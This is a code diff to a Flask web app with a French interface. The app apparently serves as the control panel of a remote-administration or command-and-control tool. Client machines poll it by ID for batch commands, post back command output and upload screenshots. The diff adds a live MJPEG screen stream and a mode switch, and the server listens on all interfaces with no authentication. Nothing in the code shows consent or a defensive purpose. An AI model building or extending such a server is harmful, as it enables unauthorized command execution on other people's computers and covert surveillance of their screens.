@@ -1,4 +1,9 @@
-from flask import Flask, request, render_template_string, send_file, redirect, url_for
+from flask import (
+    Flask, request, render_template_string,
+    send_file, redirect, url_for, Response
+)
+import time
+import threading
 
 app = Flask(__name__)
 
@@ -19,21 +24,41 @@ html_page = """
   <style>
     body { font-family: sans-serif; padding: 20px; }
     form { margin-bottom: 15px; }
-    #screen { max-width:90vw; border:1px solid #ccc; }
     .section { margin-top: 30px; }
+    #stream { max-width:90vw; border:1px solid #ccc; display:block; }
   </style>
 </head>
 <body>
   <h1>🖥️ Contrôle à Distance</h1>
 
+  <!-- Choix du mode -->
+  <div class="section">
+    <h2>Mode</h2>
+    <form action="/set_mode" method="POST" style="display:inline">
+      <button type="submit" name="mode" value="live"
+        {% if mode == 'live' %}disabled{% endif %}>
+        🔴 Live
+      </button>
+    </form>
+    <form action="/set_mode" method="POST" style="display:inline">
+      <button type="submit" name="mode" value="cmd"
+        {% if mode == 'cmd' %}disabled{% endif %}>
+        ⚪ Commande
+      </button>
+    </form>
+  </div>
+
+  {% if mode == 'cmd' %}
   <!-- Section Commande -->
   <div class="section">
     <h2>Envoyer une commande batch</h2>
     <form action="/" method="POST">
-      <input type="text" name="commande" value="{{ commande }}" placeholder="Commande batch" size="50">
+      <input type="text" name="commande" value="{{ commande }}"
+             placeholder="Commande batch" size="50">
       <br><br>
       <label>Destinataires (* = tous, !ID pour exclure) :</label>
-      <input type="text" name="destinataires" value="{{ destinataires }}" placeholder="* ou ID1,ID2,...">
+      <input type="text" name="destinataires" value="{{ destinataires }}"
+             placeholder="* ou ID1,ID2,...">
       <button type="submit">Envoyer</button>
     </form>
     <form action="/clear_output" method="POST">
@@ -44,31 +69,17 @@ html_page = """
     <h3>Résultat de la commande :</h3>
     <pre>{{ resultat_commande or "(vide)" }}</pre>
   </div>
+  {% endif %}
 
-  <!-- Section Mode -->
-  <div class="section">
-    <h2>Mode Live Screen</h2>
-    <p><strong>Mode actuel :</strong> {{ mode }}</p>
-    <form action="/set_mode" method="POST" style="display:inline">
-      <button type="submit" name="mode" value="live">🔴 Live</button>
-    </form>
-    <form action="/set_mode" method="POST" style="display:inline">
-      <button type="submit" name="mode" value="cmd">⚪ Commande</button>
-    </form>
-  </div>
-
+  {% if mode == 'live' %}
   <!-- Section Live Screen -->
   <div class="section">
     <h2>Live Screen</h2>
     <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
-    <img id="screen" src="/screen.png" alt="Live screen">
-    <script>
-      // recharge l’image toutes les 0.5s pour du live plus fluide
-      setInterval(function(){
-        document.getElementById('screen').src = '/screen.png?' + Date.now();
-      }, 500);
-    </script>
+    <!-- MJPEG Stream -->
+    <img id="stream" src="/mjpeg" alt="Live screen">
   </div>
+  {% endif %}
 </body>
 </html>
 """
@@ -88,10 +99,22 @@ def index():
         last_host=last_host
     )
 
+@app.route("/set_mode", methods=["POST"])
+def set_mode():
+    global mode
+    m = request.form.get("mode", "")
+    if m in ("live", "cmd"):
+        mode = m
+    return redirect(url_for("index"))
+
+@app.route("/get_mode")
+def get_mode():
+    return mode
+
 @app.route("/get_commande")
 def get_commande():
     global commande, destinataires
-    mid = request.args.get('id')
+    mid = request.args.get('id','')
     if not mid:
         return "", 400
 
@@ -103,12 +126,12 @@ def get_commande():
     else:
         incl = [i.strip() for i in destinataires.split(",")]
         return commande if mid in incl else ""
-    
+
 @app.route("/post_resultat", methods=["POST"])
 def post_resultat():
     global resultat_commande
-    mid = request.form.get("id", "").strip()
-    res = request.form.get("resultat", "")
+    mid = request.form.get("id","").strip()
+    res = request.form.get("resultat","")
     resultat_commande += f"\n[{mid}]\n{res}\n"
     return "OK", 200
 
@@ -118,27 +141,13 @@ def clear_output():
     resultat_commande = ""
     return redirect(url_for("index"))
 
-@app.route("/set_mode", methods=["POST"])
-def set_mode():
-    global mode
-    m = request.form.get("mode", "")
-    if m in ("live", "cmd"):
-        mode = m
-    return redirect(url_for("index"))
-
-@app.route("/get_mode")
-def get_mode():
-    # pour pass.py
-    return mode
-
 @app.route("/post_screen", methods=["POST"])
 def post_screen():
     global last_host
     f = request.files.get("screen")
-    mid = request.form.get("id", "").strip()
+    mid = request.form.get("id","").strip()
     if not f or not mid:
         return "Bad Request", 400
-    # on garde toujours latest.png pour l'affichage
     f.save("latest.png")
     last_host = mid
     return "Screenshot reçu", 200
@@ -150,5 +159,31 @@ def screen_png():
     except FileNotFoundError:
         return "", 404
 
+# --- Nouveau : endpoint MJPEG ---
+def mjpeg_generator():
+    """Génère un flux multipart/x-mixed-replace à partir de latest.png"""
+    boundary = b"--frame"
+    while True:
+        try:
+            with open("latest.png", "rb") as img:
+                frame = img.read()
+            yield boundary + b"\r\n" + \
+                  b"Content-Type: image/png\r\n\r\n" + \
+                  frame + b"\r\n"
+        except FileNotFoundError:
+            # pas encore d'image, on attend un peu
+            time.sleep(0.1)
+            continue
+        # on peut ajuster ce délai si besoin
+        time.sleep(0.1)
+
+@app.route("/mjpeg")
+def mjpeg():
+    return Response(
+        mjpeg_generator(),
+        mimetype="multipart/x-mixed-replace; boundary=frame"
+    )
+
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    # Lance le serveur
+    app.run(host="0.0.0.0", port=5000, threaded=True)
